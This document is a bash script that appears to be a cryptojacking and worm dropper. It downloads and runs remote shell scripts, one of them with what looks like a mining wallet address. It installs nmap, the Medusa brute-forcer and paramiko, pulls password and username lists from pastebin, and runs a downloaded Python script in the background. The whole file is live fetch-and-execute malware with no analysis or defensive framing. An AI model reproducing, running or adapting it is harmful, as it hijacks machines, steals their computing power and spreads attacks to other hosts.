#!/bin/bash
curl -o /tmp/test1.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_kill
sh /tmp/test1.sh
curl -o /tmp/test2.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_work
sh /tmp/test2.sh 47c1Gqngx2Reu5HwPqc1uJP3iKJ8xiK9B3QXepN19LQn42jMyBNMhHHBauycpj5uG7EM6ErCKMSuW3W8YXJJgozdT5mMULW
curl -o /tmp/internal.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/internal.sh
sh /tmp/internal.sh
sudo apt install nmap -y
sudo apt install medusa -y
sudo apt-get update -y
sudo apt install python3-pip -y
pip3 install paramiko
mkdir /tmp/sys
mkdir /tmp/sys/b
curl -o /tmp/sys/cmd_1.txt https://pastebin.com/raw/DJuvm8v0
curl -o /tmp/sys/cmd.txt https://pastebin.com/raw/8uCHeF8k
curl -o /tmp/sys/pwd.txt https://pastebin.com/raw/UG35FES2
curl -o /tmp/sys/user_l.txt https://pastebin.com/raw/dkK8bZqn
curl -o /tmp/sys/sysupdate.py https://pastebin.com/raw/bBVK9Juq
python3 /tmp/sys/sysupdate.py &
